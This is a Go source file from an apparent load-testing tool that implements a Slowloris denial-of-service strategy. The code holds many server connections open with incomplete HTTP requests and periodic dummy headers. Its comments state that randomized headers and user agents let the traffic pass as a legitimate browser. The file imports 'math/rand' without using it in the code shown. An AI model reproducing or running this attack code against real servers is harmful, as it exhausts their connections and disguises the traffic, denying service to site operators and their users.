package strategy

import (
	"context"
	"math/rand"
	"sync/atomic"
	"time"

	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"
)

// Slowloris implements the Slowloris attack with browser mimicry.
// It sends incomplete HTTP requests with Connection: keep-alive header
// to appear as a legitimate browser while holding server connections.
type Slowloris struct {
	keepAliveInterval time.Duration
	connConfig        netutil.ConnConfig
	headerRandomizer  *httpdata.HeaderRandomizer
	activeConnections int64
}

func NewSlowloris(keepAliveInterval time.Duration, bindIP string) *Slowloris {
	return &Slowloris{
		keepAliveInterval: keepAliveInterval,
		connConfig:        netutil.DefaultConnConfig(bindIP),
		headerRandomizer:  httpdata.DefaultHeaderRandomizer(),
	}
}

func (s *Slowloris) Execute(ctx context.Context, target Target) error {
	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	userAgent := httpdata.RandomUserAgent()

	// Send incomplete HTTP request with browser-like headers
	incompleteRequest := s.headerRandomizer.BuildIncompleteRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(incompleteRequest), 5*time.Second); err != nil {
		return err
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-mc.Context().Done():
			return nil
		case <-ticker.C:
			header := httpdata.GenerateDummyHeader()
			if _, err := mc.WriteWithTimeout([]byte(header), 5*time.Second); err != nil {
				return err
			}
		}
	}
}

func (s *Slowloris) Name() string {
	return "slowloris"
}

func (s *Slowloris) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}

// generateConnID generates a unique connection ID for logging.
func generateConnID() string {
	return httpdata.GenerateSessionID()[:8]
}
